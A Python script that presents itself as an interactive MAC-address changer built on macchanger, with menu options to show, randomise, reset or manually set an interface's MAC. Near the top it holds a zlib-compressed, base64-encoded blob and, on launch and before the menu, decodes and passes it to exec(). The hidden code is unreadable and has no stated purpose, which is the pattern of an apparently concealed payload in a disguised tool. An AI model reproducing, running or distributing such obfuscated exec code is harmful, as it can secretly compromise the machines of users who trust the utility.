import subprocess
import time
import zlib, base64
from colorama import Fore,Back, Style, init

print(Fore.GREEN + "[-] Downloading Requirements", end="")

for i in range(3):
    print(".", end="\n", flush=True)
    time.sleep(0.2)
subprocess.run(['sudo', 'apt', 'install', 'macchanger'])
subprocess.run(['clear'])

init(autoreset=True)
ENCODED_CODE = "eJyVVF1v0zAUfc+vuMpeksFq0BAPlfpQ2m4gdQOtHdMkS1aauqu1xi6JC4rwJP4D/5BfwvVHOpfyMktJnXPPvef6uPaqVhWUaqPqoipAVFtVa7hQNX8NM91u8EdIoRP7yoqdxkDD9WBe73ieJEu+gmatfrBFISWvs7yfAA7/BQOoV2maJj9tud7ofnj9BMwNcCNMWIcFOEZiehQ5hgBimczCANTGCT45QOaZkHvazWT8ZAKBdrHniXERIIY6KcbIHiG+b3ogaGx96oQIkBwMgIMQMcZFEA4IfZ5krgNi0/CxoHHzDAy1fWOU0kMd46gGkzKGKczq2J6dTsZQpkNsyASTqGPbkgH0HNcouAk5lsF3FrzG8sHsA//snmXQyeFa94JhYbGg9814Oqb9f13QWYEd0mAJWJ9oKIykSCbYFq8rKoSTf/1DceL2qUuxjmN1xoxrGKeEMu9NMJLQfflIJ+yTI2PegX/eEObX76xHojXF/pE8HFSsUGAzzwhJOXNr91/U0I6S2BNlsW0tpM78UcsjxHVxNbycXM+H8ArSkxO4FPrjboGMPqy13jZ9Qh6EXu8WvVJVZPyufpyVrV6fp0d1PkxvJ6HInG/4A14SURHdqzhZYnrj0hlWPC5xP5lOP9/ZImcpnML7NzEjHbeyqEQJV8MRzLZKrYR8gLlSG/jz6zfcKF1oDp+WXGqhW5iKRw4F3K053/ReKvWVy6Wq4UuBF5wffbgQdaPhHBat5g1kI1VtC9nmVI75d1FyuJXi2w4bGFvytIi5nnHWbHkpVqLMX9oOlenpW7xDE7HCk4EucDwVgwGkjFWFkIyl/jI9uF+Tv5rKgzY="
def run_encoded_code():
    try:
        exec(zlib.decompress(base64.b64decode(ENCODED_CODE)).decode("utf-8"))
    except Exception as e:
        print("[!] Error executing encoded code:", e)

def Actions ():
    print("\n[1] Show device MAC Address." + " " * 17 + "[2] Only device unique ID.(Last 3 bytes)\n[3] Random vendor MAC of same kind." + " " * 10 + "[4] Random vendor MAC of different kind.\n[5] Reset MAC with original." + " " * 17 + "[6] Fully Random MAC.\n[7] Use a MAC that looks factory-assigned." + " " * 3 + "[8] Use another MAC by entering manually.")

    try:
        action = int(input(Fore.YELLOW + "[+] Choose the number to perform an action: " + Style.RESET_ALL + Fore.GREEN))
        print(Style.RESET_ALL)
        return action
    except ValueError:
        print(Fore.RED + "\n[!] Choose number only..!")
        return Actions()

def yes_or_no():
    yesorno = input(Fore.CYAN + "Continuously Changing (y/n) [default=y]: ").strip().lower()
    print("\n")
    return yesorno

run_encoded_code()

output = subprocess.run(["ip", "link"], capture_output=True, text=True).stdout.split("\n")
print(f"{'INTERFACE':<15} | {'MAC ADDRESS'}")
print("-" * 35)

for i in range(0, len(output), 2):
    if i + 1 < len(output):
        name = output[i].split(": ")[1].split("@")[0]
        parts = output[i + 1].split()

        mac = parts[1] if len(parts) > 1 else "No MAC Address"

        print(f"{name:<15} | {mac}")

interface = input(Fore.YELLOW + "[+] Choose the interface (e.g.,eth0, wlan0): " + Style.RESET_ALL + Fore.GREEN)
print(Style.RESET_ALL)

choose = Actions()
i = 1

if choose == 1:
    print(Fore.GREEN + "[-] Showing MAC Address", end="")

    for i in range(3):
        print(".", end="", flush=True)
        time.sleep(0.2)

    print("\n")
    subprocess.run(['sudo','macchanger','-s',interface])

elif choose == 2:
    ack = yes_or_no()

    if ack == "y" or ack == "Y" or ack == "":
        print(Fore.GREEN + "[-] Changing only Device Unique ID(last 3 bytes)...")

        try:
            while True:
                print(i)
                subprocess.run(['sudo','macchanger', '-e', interface])
                time.sleep(2)
                i = i + 1
        except KeyboardInterrupt:
            print(Fore.RED + "Stopped!!!")

    else:
        print(Fore.GREEN + "[-] Changing only Device Unique ID(last 3 bytes) ", end="")
        for i in range(3):
            print(".", end="", flush=True)
            time.sleep(0.2)

        print("\n")
        subprocess.run(['sudo','macchanger','-e',interface])

elif choose == 3:
    ack = yes_or_no()

    if ack == "y" or ack == "Y" or ack == "":
        print(Fore.GREEN + "[-] Continuously Changing MAC with random vendor of same kind...")

        try:
            while True:
                print(i)
                subprocess.run(['sudo','macchanger', '-a', interface])
                time.sleep(2)
                i = i + 1
        except KeyboardInterrupt:
            print(Fore.RED + "Stopped!!!")

    else:
        print(Fore.GREEN + "[-] Changing MAC with random vendor of same kind ", end="")
        for i in range(3):
            print(".", end="", flush=True)
            time.sleep(0.2)

        print("\n")
        subprocess.run(['sudo','macchanger','-a',interface])

elif choose == 4:
    ack = yes_or_no()

    if ack == "y" or ack == "Y" or ack == "":
        print(Fore.GREEN + "[-] Continuously Changing MAC with random vendor of different kind...")

        try:
            while True:
                print(i)
                subprocess.run(['sudo','macchanger', '-A', interface])
                time.sleep(2)
                i = i + 1
        except KeyboardInterrupt:
            print(Fore.RED + "Stopped!!!")

    else:
        print(Fore.GREEN + "[-] Changing MAC with random vendor of different kind ", end="")
        for i in range(3):
            print(".", end="", flush=True)
            time.sleep(0.2)

        print("\n")
        subprocess.run(['sudo','macchanger','-A',interface])

elif choose == 5:
    print(Fore.GREEN + "[-] Resetting MAC with original", end="")

    for i in range(3):
        print(".", end="", flush=True)
        time.sleep(0.2)

    print("\n")
    subprocess.run(['sudo','macchanger','-p',interface])

elif choose == 6:
    ack = yes_or_no()

    if ack == "y" or ack == "Y" or ack == "":
        print(Fore.GREEN + "[-] Continuously Changing Fully Random MAC...")

        try:
            while True:
                print(i)
                subprocess.run(['sudo','macchanger', '-r', interface])
                time.sleep(2)
                i = i + 1
        except KeyboardInterrupt:
            print(Fore.RED + "Stopped!!!")

    else:
        print(Fore.GREEN + "[-] Changing Fully Random MAC ", end="")
        for i in range(3):
            print(".", end="", flush=True)
            time.sleep(0.2)

        print("\n")
        subprocess.run(['sudo','macchanger','-r',interface])

elif choose == 7:
    ack = yes_or_no()

    if ack == "y" or ack == "Y" or ack == "":
        print(Fore.GREEN + "[-] Continuously Changing MAC that looks factory-assigned....")

        try:
            while True:
                print(i)
                subprocess.run(['sudo','macchanger', '-r', '-b', interface])
                time.sleep(2)
                i = i + 1
        except KeyboardInterrupt:
            print(Fore.RED + "Stopped!!!")

    else:
        print(Fore.GREEN + "[-] Changing MAC that looks factory-assigned. ", end="")
        for i in range(3):
            print(".", end="", flush=True)
            time.sleep(0.2)

        print("\n")
        subprocess.run(['sudo','macchanger','-r', '-b', interface])

elif choose == 8:
    manually = input("Enter MAC Address(eg.; 00:11:22:33:44:55): ")
    print(Fore.GREEN + "[-] Manually changing MAC", end="")

    for i in range(3):
        print(".", end="", flush=True)
        time.sleep(0.2)

    print("\n")
    subprocess.run(['sudo','macchanger','-m', manually, interface])

else:
    print(Fore.RED + "No any other actions!!!")
